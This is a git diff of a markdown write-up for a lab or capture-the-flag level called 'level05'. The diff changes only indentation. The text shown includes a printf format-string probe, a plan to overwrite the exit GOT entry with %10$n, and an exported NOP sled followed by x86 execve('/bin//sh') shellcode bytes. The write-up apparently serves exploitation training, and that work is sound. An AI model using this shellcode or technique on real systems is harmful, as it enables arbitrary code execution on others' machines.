@@ -26,8 +26,8 @@ Unprotected printf alert ! exit is called after, we will redirect exit to a mali
 
 ## bash
 ```bash
-	> python -c "print 'aaaaaaaa' + '%p '*30" | ./level05 
-	aaaaaaaa0x64 0xf7fcfac0 0xf7ec3add 0xffffd6df 0xffffd6de (nil) 0xffffffff 0xffffd764 0xf7fdb000 0x61616161 0x61616161 0x25207025 0x70252070 0x20702520
+> python -c "print 'aaaaaaaa' + '%p '*30" | ./level05 
+aaaaaaaa0x64 0xf7fcfac0 0xf7ec3add 0xffffd6df 0xffffd6de (nil) 0xffffffff 0xffffd764 0xf7fdb000 0x61616161 0x61616161 0x25207025 0x70252070 0x20702520
 ```
 Our buffer is located at the 10th pointer using the %p exploit in printf, so we will overwrite at %10$n
 
@@ -57,7 +57,7 @@ We will modify exit got entry address content so that the program jumps into our
 ```
 ## bash
 ```bash
-	export SHELLCODE=$(python -c "print '\x90'*500 + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'")
+export SHELLCODE=$(python -c "print '\x90'*500 + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'")
 ```
 
 We had a difficult time finding the exact entrypoint to our shell code so we added a nopsled before
